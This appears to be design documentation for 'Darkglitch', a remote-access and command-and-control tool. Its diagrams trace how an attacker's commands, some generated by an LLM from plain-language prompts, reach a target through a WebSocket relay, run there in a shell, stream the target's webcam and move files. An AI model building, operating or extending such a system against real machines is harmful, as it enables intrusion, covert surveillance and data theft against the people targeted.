# Darkglitch Architecture — Flow Diagrams

## 1. High-Level System Architecture

```mermaid
flowchart TB
    subgraph Attacker["Attacker Machine"]
        CLI["CLI Interface\n(darkglitch.py)"]
        AI["AI Pipeline\n(core/ai/groq.py + tools/ai_utils/ai.py)"]
        CMD["Command Engine\n(tools/injection_utils/remote_command_handler.py)"]
        FILE["File Transfer\n(tools/transfer_utils/transfer.py)"]
        MEDIA_RX["Media Receiver\n(tools/media/receiver.py)"]
    end

    subgraph Network["Network Layer"]
        SIG["Signaling Server\n(malware-signal.vercel.app)\nWebSocket Relay"]
        STUN["STUN Server\n(stun.l.google.com:19302)\nNAT Traversal"]
    end

    subgraph Target["Target Machine"]
        LISTENER["Listener\n(malware_signal/signal.py)"]
        EXEC["Shell Executor\n(subprocess.run shell=True)"]
        WEBCAM["WebCam\n(/dev/video0 via V4L2)"]
        FS["Filesystem"]
    end

    subgraph External["External AI"]
        GROQ["Groq API\nLLM Inference\n(openai/gpt-oss-20b)"]
    end

    %% Connections
    CLI --> AI
    CLI --> CMD
    CLI --> FILE
    CLI --> MEDIA_RX
    
    AI <--> GROQ
    AI --> CMD
    
    CMD <--> SIG
    FILE <--> SIG
    MEDIA_RX <--> SIG
    
    SIG <-->|WebSocket| LISTENER
    SIG <-->|ICE Candidates| STUN
    
    LISTENER --> EXEC
    LISTENER --> WEBCAM
    LISTENER --> FS
    
    EXEC --> FS
    FILE --> FS
    
    STUN <-->|WebRTC P2P| MEDIA_RX
    STUN <-->|WebRTC P2P| WEBCAM
```

---

## 2. AI Pipeline — End-to-End Flow

```mermaid
flowchart LR
    subgraph Input["INPUT"]
        NL["Natural Language\n'darkglitch -ai <id> list folders'"]
    end

    subgraph Perception["1. PERCEPTION"]
        CLI2["CLI Dispatch\n(dispatch_command)"]
        ARGS["Argument Parsing\n-m ai_bash_mode()"]
    end

    subgraph Analysis["2. ANALYSIS"]
        LLM["GroqProvider.generate()\nPrompt → LLM"]
        EXTRACT["_extract_command_text()\nMulti-strategy parser"]
        FALLBACK["_fallback_command()\nKeyword → command map"]
    end

    subgraph Decision["3. DECISION MAKING"]
        CHECK{"Provider available?"}
        EMPTY{"Command empty?"}
    end

    subgraph Execution["4. EXECUTION"]
        CONN["SignalClient.connect()\nWebSocket to signaling"]
        SEND["send_command()\nUUID + asyncio.Future"]
        RELAY["Signaling relays\nto target via WebSocket"]
        SHELL["subprocess.run()\nshell=True, timeout=120s"]
    end

    subgraph Feedback["5. FEEDBACK"]
        RESULT["Result packaged:\n{status, output, error}"]
        FUTURE["Future resolved\nawait returns"]
        DISPLAY["Console output"]
    end

    %% Flow
    Input --> Perception
    Perception --> Analysis
    
    Analysis --> LLM
    LLM --> EXTRACT
    EXTRACT --> Decision
    
    CHECK -->|Yes| EXTRACT
    CHECK -->|No| FALLBACK
    
    EMPTY -->|"No"| Execution
    EMPTY -->|"Yes"| FALLBACK
    
    Decision --> Execution
    Execution --> CONN --> SEND --> RELAY --> SHELL
    SHELL --> Feedback
    Feedback --> RESULT --> FUTURE --> DISPLAY
    
    style LLM fill:#e1b12c,color:#000
    style EXTRACT fill:#e1b12c,color:#000
    style FALLBACK fill:#f5f6fa,color:#333
    style SHELL fill:#c0392b,color:#fff
```

---

## 3. Message Routing & Handler Dispatch

```mermaid
flowchart TB
    subgraph Wire["WebSocket Inbound"]
        MSG["Raw JSON Message"]
    end

    subgraph Router["RemoteCommandHandler.dispatch_message()"]
        TYPE{"Check\nmessage['type']"}
    end

    subgraph Handlers["Handler Functions"]
        OFFER["_handler_offer()\nExtract from SDP"]
        ANSWER["_handle_answer()\nExtract result from SDP"]
        CMD["_process_command_request()\nExecute on machine"]
        RESULT["_handle_command_result()\nResolve pending future"]
        ICE["Peer.handle_message()\nAdd ICE candidate"]
        PEER["OnlineHandler\nDisplay peer list"]
    end

    subgraph Actions["Actions"]
        EXEC2["subprocess.run()\nShell execution"]
        RESPOND["_send_result()\nResponse via signaling"]
        FUTURE_RES["future.set_result()\nUnblock caller"]
        WEBRTC["RTCPeerConnection\naddIceCandidate()"]
        PRINT["Print to console"]
    end

    MSG --> TYPE

    TYPE -->|"type = 'offer'"| OFFER
    TYPE -->|"type = 'answer'"| ANSWER
    TYPE -->|"type = 'remote-command'"| CMD
    TYPE -->|"type = 'remote-command-result'"| RESULT
    TYPE -->|"type = 'ice-candidate'"| ICE
    TYPE -->|"type = 'peer-list'"| PEER

    OFFER --> CMD
    ANSWER --> RESULT
    CMD --> EXEC2
    EXEC2 --> RESPOND
    RESULT --> FUTURE_RES
    ICE --> WEBRTC
    PEER --> PRINT

    style MSG fill:#9b59b6,color:#fff
    style TYPE fill:#e74c3c,color:#fff
    style Router fill:#c0392b,color:#fff
```

---

## 4. Connection & Peer Lifecycle

```mermaid
sequenceDiagram
    participant A as Attacker (darkglitch.py)
    participant SIG as Signaling Server
    participant T as Target (listener.py)
    participant LLM as Groq API

    rect rgb(240, 248, 255)
        Note over A,T: PHASE 1: Target Registration
        T->>SIG: WebSocket connect /ws/{room}/{client_id}
        T->>SIG: {"type":"register", "client_id":"...", "username":"..."}
        SIG-->>T: Connection established, listening...
    end

    rect rgb(255, 240, 245)
        Note over A,T: PHASE 2: Attacker Connects & AI Processing
        A->>SIG: WebSocket connect
        A->>SIG: {"type":"register", ...}
        A->>A: Parse CLI arguments (-ai mode)
        A->>LLM: POST /v1/responses (prompt: "list folders")
        LLM-->>A: "You can use: ls -la /"
        A->>A: _extract_command_text() → "ls -la /"
    end

    rect rgb(240, 255, 240)
        Note over A,T: PHASE 3: Command Delivery
        A->>SIG: {"type":"offer", "target":"<target_id>", 
        Note over A,SIG: "sdp": '{"type":"remote-command", "command":"ls -la /", "request_id":"uuid"}'
        SIG->>T: Relay offer to target
        T->>T: dispatch_message() → _handler_offer() → _process_command_request()
    end

    rect rgb(255, 248, 240)
        Note over A,T: PHASE 4: Execution & Response
        T->>T: subprocess.run("ls -la /", shell=True)
        T-->>T: stdout: "drwxr-xr-x root root ..."
        T->>SIG: {"type":"answer", "target":"<attacker_id>",
        Note over T,SIG: "sdp": '{"type":"remote-command-result", "request_id":"...", "status":"success", "output":"..."}'
        SIG->>A: Relay answer to attacker
        A->>A: _handle_command_result() → future.set_result()
        A->>A: Print output: "drwxr-xr-x root root ..."
    end

    rect rgb(245, 245, 255)
        Note over A,T: PHASE 5: Teardown
        A->>A: Cancel listener task
        A->>SIG: WebSocket close
        T-->>T: Continue listening for next command
    end
```

---

## 5. File Transfer Protocol Flow

```mermaid
flowchart LR
    subgraph Local["Attacker Machine"]
        L_FILE["Local file/directory"]
        PAYLOAD["build_transfer_payload()\nbase64 encode"]
        SCRIPT["build_transfer_command()\nGenerate Python script"]
        CMD_CHAN["RemoteCommandHandler\nsend_command()"]
    end

    subgraph Remote["Target Machine"]
        CMD_RX["Receive command"]
        PYTHON["Execute:\npython3 - <<'PY'\n...\nPY"]
        DECODE["base64 decode"]
        WRITE["Write to filesystem"]
        READ["Read from filesystem"]
        ENCODE["base64 encode"]
        OUTPUT["Print JSON result\nvia stdout"]
    end

    subgraph Return["Result Pipeline"]
        RESULT_CHAN["Result travels back\nas remote-command-result"]
        PARSE["Parse JSON output"]
        LOCAL_WRITE["Write to local filesystem"]
    end

    %% Upload flow
    L_FILE --> PAYLOAD --> SCRIPT --> CMD_CHAN --> CMD_RX --> PYTHON --> DECODE --> WRITE

    %% Download flow
    READ --> ENCODE --> OUTPUT --> RESULT_CHAN --> PARSE --> LOCAL_WRITE

    style PAYLOAD fill:#2ecc71,color:#fff
    style SCRIPT fill:#2ecc71,color:#fff
    style PYTHON fill:#3498db,color:#fff
    style DECODE fill:#f39c12,color:#fff
    style ENCODE fill:#f39c12,color:#fff
```

---

## 6. Media Streaming Architecture

```mermaid
flowchart TB
    subgraph TargetSide["Target (Streamer)"]
        WEBCAM2["WebCam\n/dev/video0 V4L2"]
        PLAYER["MediaPlayer\n640x480@30fps"]
        PEER_SEND["Peer(signal)\n-createOffer()\n-Add tracks"]
    end

    subgraph Signaling2["Signaling Channel"]
        SIG2["Signaling Server"]
        ICE2["STUN/TURN\nICE negotiation"]
    end

    subgraph AttackerSide["Attacker (Receiver)"]
        PEER_RECV["Peer(signal)\n-Set remote description\n-Add ICE candidates"]
        ON_TRACK["on_track handler"]
        DISPLAY["show_video()\nOpenCV/Tkinter window"]
        RECORD["MediaRecorder\nreceived.mp4"]
    end

    WEBCAM2 -->|/dev/video0| PLAYER
    PLAYER -->|VideoTrack + AudioTrack| PEER_SEND
    PEER_SEND <-->|Offer/Answer/ICE| SIG2
    SIG2 <-->|Offer/Answer/ICE| PEER_RECV
    PEER_SEND <-->|SRTP/SCTP| PEER_RECV
    PEER_RECV --> ON_TRACK
    ON_TRACK -->|Video frames| DISPLAY
    ON_TRACK -->|Record| RECORD

    style WEBCAM2 fill:#e74c3c,color:#fff
    style DISPLAY fill:#9b59b6,color:#fff
    style RECORD fill:#34495e,color:#fff
```

---

## 7. AI Command Extraction — Algorithm Deep Dive

```mermaid
flowchart TB
    START["LLM Response String"] --> P1{"Is it a str?"}
    P1 -->|Yes| TEXT["text = response.strip()"]
    P1 -->|No| P2{"Is it a dict?"}
    P2 -->|Yes| P3{"Has 'response' key?"}
    P2 -->|No| P4{"Has .response attr?"}
    P3 -->|Yes| TEXT
    P3 -->|No| P5{"Has 'content' key?"}
    P5 -->|Yes| TEXT
    P5 -->|No| P6{"Has 'message.content'?"}
    P6 -->|Yes| TEXT
    
    TEXT --> CLEAN["Remove ```bash and ``` fences"]
    CLEAN --> REGEX{"Regex match\nbacktick or\ncommand keyword?"}
    REGEX -->|Match found| CHECK_WORDS{"Starts with\n'here are', 'you can',\n'this will'?"}
    CHECK_WORDS -->|No| RETURN["✅ RETURN command"]
    CHECK_WORDS -->|Yes| LINE_BY_LINE
    
    REGEX -->|No match| LINE_BY_LINE["Split into lines,\nremove URLs, notes,\nconversational phrases"]
    LINE_BY_LINE --> FILTER{"Line matches\n[a-zA-Z0-9_./\\-: ]+\nAND not conversational?"}
    FILTER -->|Yes| RETURN
    FILTER -->|No line passes| FALLBACK_TRIGGER["Use _fallback_command()\nkeyword mapping"]
    FALLBACK_TRIGGER --> KEYWORD{"Prompt contains\n'list'?'whoami'?'pwd'?"}
    KEYWORD -->|list| LS["ls -la /"]
    KEYWORD -->|whoami| WHO["whoami"]
    KEYWORD -->|pwd| PWD["pwd"]
    KEYWORD -->|process| PS["ps aux"]
    KEYWORD -->|none| DEFAULT["whoami (default)"]
    LS --> RETURN
    WHO --> RETURN
    PWD --> RETURN
    PS --> RETURN
    DEFAULT --> RETURN

    style START fill:#9b59b6,color:#fff
    style RETURN fill:#2ecc71,color:#fff
    style FALLBACK_TRIGGER fill:#e1b12c,color:#000
    style CLEAN fill:#3498db,color:#fff
```

---

## 8. Safety & Error Handling Matrix

```mermaid
flowchart LR
    subgraph Failures["Failure Modes"]
        F1["LLM API Unreachable"]
        F2["LLM Returns Empty"]
        F3["LLM Returns Garbage"]
        F4["WebSocket Disconnect"]
        F5["Command Timeout (>120s)"]
        F6["Non-Zero Exit Code"]
        F7["Target Disconnects"]
        F8["Invalid JSON Payload"]
    end

    subgraph Handlers["Handling Strategies"]
        H1["→ _fallback_command() keyword map"]
        H2["→ _fallback_command() keyword map"]
        H3["→ Regex extraction; if fail → fallback"]
        H4["→ Retry loop every 10s"]
        H5["→ asyncio.TimeoutError → abort"]
        H6["→ Return {status:error, output:stderr}"]
        H7["→ Future never resolves → timeout"]
        H8["→ Skip message, continue listening"]
    end

    F1 --> H1
    F2 --> H2
    F3 --> H3
    F4 --> H4
    F5 --> H5
    F6 --> H6
    F7 --> H5
    F8 --> H8

    style Failures fill:#e74c3c,color:#fff
    style Handlers fill:#27ae60,color:#fff
```

---

## 9. Component Dependency Map

```mermaid
flowchart TB
    subgraph Entry["Entry Point"]
        MAIN["darkglitch.py\nmain()"]
    end

    subgraph Core["Core"]
        AI_BASE["core/ai/base.py\nLLMProvider (ABC)"]
        GROQ["core/ai/groq.py\nGroqProvider"]
        CONFIG["core/data/config.py\nHOST, ROOM"]
        CLIENT["core/data/client.py\nclient_id, username"]
    end

    subgraph Signal["Signaling"]
        SIGNAL["malware_signal/signal.py\nSignalClient"]
        PEER["malware_signal/peer.py\nPeer"]
        DEBUG_H["malware_signal/handler/debug_handler.py"]
        ONLINE_H["malware_signal/handler/online_handler.py"]
    end

    subgraph Tools["Tools"]
        AI_UTIL["tools/ai_utils/ai.py\nextract + fallback"]
        CMD_HANDLER["tools/injection_utils/\nremote_command_handler.py"]
        SHELL["tools/command/bash/shell.py\nbash modes"]
        LISTENER["tools/command/listen/listener.py"]
        ONLINE["tools/command/list/online_list.py"]
        FILE_TRANS["tools/command/transfer/file.py"]
        TRANSFER["tools/transfer_utils/transfer.py"]
        MEDIA_RX["tools/media/receiver.py"]
        WEBCAM2["tools/media/web_cam.py"]
        MEDIA_UTIL["tools/media_utils/media.py"]
    end

    subgraph Utils["Utilities"]
        BANNER["utilities/banner.py"]
        COLORS["utilities/colors.py"]
        HELPER["utilities/helper.py"]
        VERSION["utilities/version.py"]
    end

    %% Dependencies
    MAIN --> HELPER
    MAIN --> SHELL
    MAIN --> ONLINE
    MAIN --> LISTENER
    MAIN --> FILE_TRANS

    SHELL --> AI_UTIL
    SHELL --> GROQ
    SHELL --> SIGNAL
    SHELL --> PEER
    SHELL --> CMD_HANDLER
    SHELL --> CONFIG
    SHELL --> CLIENT
    SHELL --> MEDIA_UTIL

    GROQ --> AI_BASE

    SIGNAL --> CONFIG
    SIGNAL --> CLIENT

    CMD_HANDLER --> SIGNAL

    LISTENER --> SIGNAL
    LISTENER --> CMD_HANDLER
    LISTENER --> WEBCAM2
    LISTENER --> PEER
    LISTENER --> CLIENT
    LISTENER --> CONFIG

    ONLINE --> SIGNAL
    ONLINE --> ONLINE_H
    ONLINE --> CONFIG
    ONLINE --> CLIENT

    FILE_TRANS --> TRANSFER
    TRANSFER --> SIGNAL
    TRANSFER --> CMD_HANDLER
    TRANSFER --> CONFIG
    TRANSFER --> CLIENT

    MEDIA_RX --> SIGNAL

    style Entry fill:#2c3e50,color:#fff
    style Core fill:#8e44ad,color:#fff
    style Signal fill:#2980b9,color:#fff
    style Tools fill:#27ae60,color:#fff
    style Utils fill:#7f8c8d,color:#fff
```

---

## 10. Complete End-to-End Data Flow Example

**Prompt:** `darkglitch -ai <target> "list all running processes"`

```
User Input
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│  CLI: darkglitch.py dispatch_command()                      │
│  → dispatches to ai_bash_mode(target, "list all running...") │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│  STEP 1: AI GENERATION                                      │
│  GroqProvider.generate("list all running processes")        │
│  → HTTP POST to api.groq.com/openai/v1/responses            │
│  → Model: openai/gpt-oss-20b                                │
│  → Response: "You can use 'ps aux' to list processes\n```\nps aux\n```"│
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│  STEP 2: COMMAND EXTRACTION                                 │
│  _extract_command_text(response)                            │
│  → Strip ```bash / ``` fences                               │
│  → Regex match backtick content: "ps aux"                   │
│  → Return: "ps aux"                                         │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│  STEP 3: SIGNALING CONNECTION                               │
│  SignalClient(ROOM="D4RKGLI7CH", id=uuid, HOST="https://...") │
│  → WebSocket.connect("wss://malware-signal.vercel.app/...") │
│  → {"type":"register", "client_id":"...", "username":"..."}  │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│  STEP 4: COMMAND PACKAGING                                  │
│  RemoteCommandHandler.send_command(target, "ps aux")        │
│  → request_id = uuid.uuid4()                                │
│  → asyncio.Future created → stored in _pending_results      │
│  → WebSocket send:                                           │
│    {                                                         │
│      "type": "offer",                                        │
│      "target": "<target_id>",                                │
│      "sdp": '{"type":"remote-command",                       │
│               "command":"ps aux",                            │
│               "request_id":"<uuid>"}'                        │
│    }                                                         │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│  STEP 5: SIGNALING RELAY                                    │
│  malware-signal.vercel.app receives offer                    │
│  Looks up target's active WebSocket connection               │
│  Forwards message to target                                  │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│  STEP 6: TARGET RECEPTION                                   │
│  Target's SignalClient.listen() receives message             │
│  → RemoteCommandHandler.dispatch_message()                   │
│  → Sees type="offer"                                        │
│  → _handler_offer(): extracts command from SDP               │
│  → _process_command_request():                               │
│      - sender = "<attacker_id>"                              │
│      - command = "ps aux"                                    │
│      - request_id = "<uuid>"                                 │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│  STEP 7: SHELL EXECUTION                                    │
│  subprocess.run("ps aux", shell=True, capture_output=True,  │
│                 text=True, timeout=120)                      │
│  → returncode = 0                                           │
│  → stdout = "USER PID %CPU ...\nroot 1 0.0 ..."            │
│  → stderr = ""                                               │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│  STEP 8: RESULT PACKAGING & SEND                            │
│  _send_result() → packages:                                  │
│  {                                                           │
│    "type": "answer",                                         │
│    "target": "<attacker_id>",                                │
│    "sdp": '{"type":"remote-command-result",                  │
│             "request_id":"<uuid>",                           │
│             "status":"success",                              │
│             "output":"USER PID %CPU ...\nroot 1 0.0 ..."}'   │
│  }                                                           │
│  → WebSocket send to signaling server                        │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│  STEP 9: ATTACKER RECEIVES RESULT                            │
│  Signaling relays answer back to attacker                    │
│  → _handle_command_result(message)                           │
│  → Looks up request_id in _pending_results                   │
│  → Calls future.set_result(message)                          │
│  → Await resolves → result variable populated                │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│  STEP 10: OUTPUT DISPLAY                                     │
│  result["status"] == "success" → print result["output"]      │
│  Console:                                                     │
│    [+] AI BASH MODE                                          │
│    [+] GENERATED COMMAND: ps aux                             │
│    USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND    │
│    root    1  0.0  0.1  ...                                  │
│    [+] BASH EXECUTED SUCCESSFULLY                            │
│                                                              │
│  Cleanup: cancel listener, close WebSocket                   │
└─────────────────────────────────────────────────────────────┘
```

---

## Architecture Summary

| Aspect | Description |
|--------|-------------|
| **Pattern** | Peer-to-peer C2 with centralized signaling |
| **Transport** | WebSocket (signaling) + WebRTC (media) |
| **AI Interface** | Groq API via OpenAI-compatible SDK |
| **Execution** | `subprocess.run(shell=True)` on target |
| **State Model** | Stateless AI, ephemeral request futures |
| **Safety** | No whitelist/blacklist; TLS at transport layer only |
| **Resilience** | Retry loop (10s), timeout (120s), fallback commands |
| **Scalability** | Room-based grouping; unlimited peers per room |

